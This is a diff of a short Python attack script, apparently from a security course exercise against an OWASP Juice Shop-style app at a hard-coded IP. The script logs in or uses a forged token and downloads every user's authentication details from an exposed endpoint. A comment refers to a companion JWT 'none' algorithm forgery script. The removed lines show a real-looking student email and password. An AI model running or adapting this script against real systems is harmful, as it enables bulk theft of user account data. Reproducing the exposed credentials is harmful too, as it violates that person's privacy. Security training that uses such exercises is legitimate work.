@@ -1,34 +1,30 @@
-import base64
 import json
-import time
+import sys
 
 import requests
 
 s = requests.Session()
 
+# Login with any user or forge a token with "JWT None Alg Attack.py"
 r = s.post(
     'http://43.241.202.47:3003/rest/user/login',
     data=json.dumps({
-        "email": 'a1644290@student.adelaide.edu.au',
-        "password": 'qwerty',
+        "email": 'example@example.com',
+        "password": 'example',
     }),
     headers={'Content-type': 'application/json;charset=utf-8'},
 )
-
 print("Login:", r)
-
-
+if r.status_code != 200:
+    sys.exit()
 s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})
 
-r = s.get('http://43.241.202.47:3003/rest/user/authentication-details/')  # TODO better URL to use it on?
+# Download list of all users
+r = s.get('http://43.241.202.47:3003/rest/user/authentication-details/')
 
-print(r.text)
-
-for user in json.loads(r.text)['data']:
-    print(user)
-
-
-r = s.get("http://43.241.202.47:3003/api/Users/1")
-
-print(r)
-print(r.text)
+if r.status_code == 200:
+    print("All users in database:")
+    for user in json.loads(r.text)['data']:
+        print(user)
+else:
+    print("Failed to download users:", r.status_code)
